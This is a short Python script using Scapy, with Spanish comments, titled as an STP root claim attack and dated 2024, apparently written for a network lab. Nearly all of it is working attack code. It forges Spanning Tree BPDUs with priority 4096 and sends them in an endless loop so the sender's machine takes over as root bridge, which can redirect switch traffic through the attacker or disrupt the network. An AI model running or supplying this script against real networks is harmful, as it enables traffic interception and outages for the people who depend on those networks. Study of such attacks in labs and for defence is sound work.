# Script-ataque-STP-Claim-Root-Attack
#!/usr/bin/env python3
# STP Root Claim Attack
# Autor: Alison - 20241113

from scapy.all import *

# ============================================================
# CONFIGURACION
# ============================================================
INTERFAZ = "eth0"  # Cambia si tu interfaz es diferente
# ============================================================

# MAC del switch actual (Root Bridge)
SWITCH_MAC = "aa:bb:cc:00:01:00"

# Prioridad baja para ganar la eleccion de Root Bridge
# IOU1 tiene 32769, nosotros ponemos 4096 para ganar
PRIORIDAD = 4096

print("=" * 55)
print("   STP ROOT CLAIM ATTACK")
print("=" * 55)
print(f"[*] Interfaz : {INTERFAZ}")
print(f"[*] Prioridad: {PRIORIDAD} (menor que 32769)")
print(f"[*] Enviando BPDUs maliciosos...")
print("=" * 55)

# Construir BPDU malicioso
bpdu = (
    Ether(dst="01:80:c2:00:00:00", src=get_if_hwaddr(INTERFAZ)) /
    LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
    STP(
        proto=0,
        version=0,
        bpdutype=0,
        bpduflags=0,
        rootid=PRIORIDAD,
        rootmac=get_if_hwaddr(INTERFAZ),
        pathcost=0,
        bridgeid=PRIORIDAD,
        bridgemac=get_if_hwaddr(INTERFAZ),
        portid=0x8001,
        age=0,
        maxage=20,
        hellotime=2,
        fwddelay=15
    )
)

# Enviar continuamente
count = 0
while True:
    sendp(bpdu, iface=INTERFAZ, verbose=False)
    count += 1
    if count % 10 == 0:
        print(f"[+] {count} BPDUs enviados - Reclamando Root Bridge...")
